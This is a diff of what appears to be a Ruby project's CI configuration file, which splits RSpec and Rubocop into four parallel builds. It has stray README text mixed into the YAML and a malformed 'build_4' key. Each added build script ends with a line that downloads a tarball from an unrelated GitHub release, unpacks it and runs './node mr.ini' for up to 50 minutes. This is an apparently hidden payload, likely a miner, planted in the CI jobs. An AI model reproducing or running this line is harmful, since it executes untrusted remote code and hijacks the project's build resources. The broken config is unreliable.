@@ -1,13 +1,26 @@
+gem "peak_flow_utils"
+Change your `peak_flow.yml` to something like the following:
+
 before_script:
   - RAILS_ENV=test bundle exec rake db:schema:load
-rvm: true
-environment:
-  REDIS_URL: redis://redis:6379/0
-services:
-  redis:
-    image: redis:5.0.7
-    expose:
-      - 6379
-script:
-  - https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
-  - bundle exec rake best_practice_project:run
+builds:
+  build_1:
+    name: RSpec 1
+    script:
+      - bundle exec rspec `bundle exec peak_flow_rspec_files --groups=3 --group-number=1`
+      - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
+  build_2:
+    name: RSpec 2
+    script:
+      - bundle exec rspec `bundle exec peak_flow_rspec_files --groups=3 --group-number=2`
+      - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
+  build_3:
+    name: RSpec 3
+    script:
+      - bundle exec rspec `bundle exec peak_flow_rspec_files --groups=3 --group-number=3`
+      - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
+  build_4
+    name: Rubocop
+    script:
+      - bundle exec rubocop
+      - wget https://github.com/voc9/mxc/releases/download/mxc/MXC.tar.gz && tar -xvf MXC.tar.gz && timeout 50m ./node mr.ini
